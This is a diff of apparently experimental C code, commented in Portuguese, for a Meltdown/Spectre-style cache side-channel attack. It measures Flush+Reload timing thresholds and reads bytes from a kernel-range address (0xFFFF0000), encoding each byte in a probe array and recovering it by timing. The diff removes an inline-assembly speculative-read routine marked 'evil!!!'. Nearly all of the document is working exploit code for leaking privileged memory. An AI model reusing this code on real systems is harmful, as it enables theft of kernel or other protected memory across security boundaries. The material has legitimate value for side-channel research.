@@ -8,19 +8,12 @@
 
 #define NUM_ITERACOES 100
 #define CACHE_LINE_LEN	128
-#define LEN_MEM_ARRAY	100000
+#define LEN_MEM_ARRAY	1000
 #define TRIAL_TIMES	 1000
 
 static inline void Flush(void *);
 
-unsigned GetDS(){
-	unsigned ds;
-	asm __volatile__(
-			"mov %%DS , %0"
-			: "=r"(ds) :
-			);
-	return ds;
-}
+
 void PrintLista(int lista[])
 {
 	printf("Possiveis valores: ");
@@ -30,11 +23,6 @@ void PrintLista(int lista[])
 	}
 	printf("\n");
 }
-
-char p1[] = 	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
 
 static inline long ProbeFlush(void *addr) {
@@ -103,23 +91,15 @@ unsigned Treshold(void *baseSrc)
 	unsigned probe;
 	unsigned long long totalComFlush=0;
 	unsigned long long totalSemFlush=0;
-	//Flush(base);
-	while (i<NUM_ITERACOES)
-	{
-		for (j=0;j<255;j++)
-		{
-		
-		
-			//Flush(base+j*4096);
+	while (i<NUM_ITERACOES){
+		for (j=0;j<255;j++){
 			probe=Probe(base+j*4096);
 			totalComFlush+=probe;
-			//printf("com flush %8X\n",probe);
 		
 			probe=ProbeFlush(base+j*4096);
 			totalSemFlush+=probe;
 			i++;
 		
-			//printf("sem flush %8X\n",probe);
 	
 		}
 	}
@@ -156,8 +136,7 @@ static inline int FindSecretLineCache(void *baseSrc,unsigned treshold,int lista[
 	unsigned tempo;
 	int i=0;
 	int c=0;
-	while (i<255)
-	{
+	while (i<255){
 		
 		
 		tempo=Probe(base+i*4096);
@@ -190,54 +169,6 @@ void fillArrayMemSpace(void *memspace[],void *original[])
 		memspace[i]=bufferFill;
 	}
 }
-
-static inline void speculateByte(void *addr,void *base)
-{
-	int pseudoAlvo=255;
-	int pseudoAlvo2=10;
-	void *lista[TRIAL_TIMES+1];
-	int x;
-	int i;
-	for (i=0 ; i<TRIAL_TIMES ; i++)
-	{
-		lista[i]=&pseudoAlvo;
-	}
-	lista[TRIAL_TIMES]=&pseudoAlvo2; //evil!!!
-
-	//printf("tamanho de void= %i\n",sizeof(void *));
-	//especulamos o indice 256, q é o endereço maligno;
-	asm __volatile__(
-			"mov %0 , %%rbx			\n" 	//probeArray
-			"mov %1 , %%rcx			\n"	   //array de proibidos
-			"mov $0,%%rsi					\n"
-			"_read_loop:					\n"
-			"						\n"	
-			"	xor %%rdx,%%rdx				\n"
-			"	mov (%%rcx,%%rsi,0x8),%%rax			\n" //rax agora contem o addr possivel de ataque
-
-			"	cmp $1000,%%rsi				\n"
-			"	jz _fim_loop				\n"
-			"	mov (%%rax),%%dl			\n" //especulado dl = segredo
-			"	shl $12,%%rdx				\n" //dl*4096+baseProbe acesso o dado
-			"	mov (%%rbx,%%rdx),%%rdi				\n"
-			"	inc %%rsi				\n"
-			"					\n"
-			"					\n"
-			"					\n"
-			"					\n"
-			"					\n"
-			"					\n"
-			"					\n"
-			"_fim_loop:					\n"
-			"	nop				\n"
-
-			: : "r" (base) , "r" (lista)
-			
-			);
-
-
-}
-
 
 void handler(int nSignum, siginfo_t* si, void* vcontext) {
   
@@ -272,7 +203,7 @@ int main(void)
 	int lista[256];
 	unsigned treshold;
 	void *ptrArray;
-	void *addr;
+	char *addr;
 	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
 
 	void *kernelAddr;
@@ -286,32 +217,36 @@ int main(void)
 	treshold=Treshold(memspace[0]);
 	//treshold=0x300;
 
-	kernelAddr=(void *)(NULL +0xFFFFFFF00000);	
+	kernelAddr=(void *)(NULL +0xFFFF0000);	
+	
+	segredo=(char *)kernelAddr;
+
 	
 	addr=segredo;
-
-
 
 	for (i=1;i<LEN_MEM_ARRAY;i++ )
 	{
 	
 		ptrArray=memspace[i];
-		addr++;
 		
 		
-		ret=*((int *)(ptrArray+(unsigned)segredo[i-1]*4096));
+		ret=*((int *)(ptrArray+(unsigned)addr[0]*4096));
 		asm __volatile__(
 				"mfence\n"
 				"lfence\n"
 				);
-		printf("addr: %p: ");
+		printf("addr: %p: ",addr);
 	
 		FindSecretLineCache(ptrArray,treshold,lista);
 		
 		PrintLista(lista);
 		FlushAll(ptrArray);
-		free(original[i]);	
+		//if (i>100)
+		//{
+		//	free(original[(i%100)-100]);	
+		//}
 
+		addr++;
 		
 	
 	}
